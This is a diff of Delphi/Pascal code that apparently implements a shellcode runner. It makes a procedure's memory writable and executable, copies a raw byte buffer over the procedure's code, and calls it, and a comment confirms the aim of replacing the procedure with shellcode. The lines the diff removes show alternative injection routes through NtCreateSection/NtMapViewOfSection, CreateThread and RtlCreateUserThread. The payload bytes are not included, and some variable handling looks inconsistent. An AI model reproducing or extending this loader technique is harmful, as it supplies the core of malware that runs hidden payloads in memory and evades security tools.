@@ -1331,6 +1331,8 @@ end;
 end;
 {$OPTIMIZATION ON}
 
+
+// Dummy function (to help calculate the size of the TestMsg function)
 procedure TestMsg2();
 begin
 end;
@@ -1358,10 +1360,7 @@ hSection: HANDLE;
   NewMem, test: Pointer;
 begin
 
-                       //         LargeSize := IntToLargeInt(Length(RawData));
-  //NtCreateSection(@hSection, SECTION_ALL_ACCESS, nil, @LargeSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
- // NtMapViewOfSection(hSection, GetCurrentProcess(), @BaseAddress, 0, 0, nil, @ViewSize, 2, 0, PAGE_EXECUTE_READWRITE);
-    //           Move(RawData[0], BaseAddress^, Length(RawData));
+              
 
 
 
@@ -1377,31 +1376,27 @@ begin
   // Change memory protection to allow writing
   if VirtualProtect(Pointer(Addr), funcsize, PAGE_EXECUTE_READWRITE, @OldProtect) then
   begin
-      MessageBoxA(0, PChar('erasing ' + IntToStr(funcsize) + ' bytes for the function.'), 'erasing', 0);
-    // Overwrite the procedure's code with zeros
-    //VirtualFree(Pointer(Addr), 0, MEM_RELEASE);
+      MessageBoxA(0, PChar('The current TestMsg functio is ' + IntToStr(funcsize) + ' bytes in size..'), 'Function Size', 0);
+
 
       NewMem := VirtualAlloc(nil, funcsize2, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-   // FillChar(Pointer(Addr)^, funcsize, 0);
-       MessageBoxA(0, 'moving data', 'moving data', 0);
-   //Move(RawData[0], Pointer(Addr)^, funcsize);
+
+     
    Move(RawData[0],  Pointer(@TestMsg)^, funcsize2);
       shproc := @TestMsg;
    shproc := NewMem;
 
-       MessageBoxA(0, 'restoring protection', 'restoring protection', 0);
+    
 
 
 
-    //VirtualFree(Pointer(Addr), 0, MEM_RELEASE);
+
   end;
-                                           MessageBoxA(0, 'erased', 'erased', 0);
+                                          // Call the function again to see if it has been replaced with the shellcode
                                                                    TestMsg();
 
-                      // NtCreateThread(@hThread, THREAD_ALL_ACCESS, nil, pi.hProcess, @cid, @ctx, nil, False);
-                    // hThread :=  CreateThread(nil, 0, BaseAddress, nil, 0, nil);
-                       //RtlCreateUserThread(GetCurrentProcess(), nil, False, 0, 0, 0, BaseAddress, nil, @hThread, nil);
+                    
 
 
                            MessageBoxA(0, 'Execution Completed Successfully!', 'Termination', MB_OK OR MB_ICONINFORMATIOn);
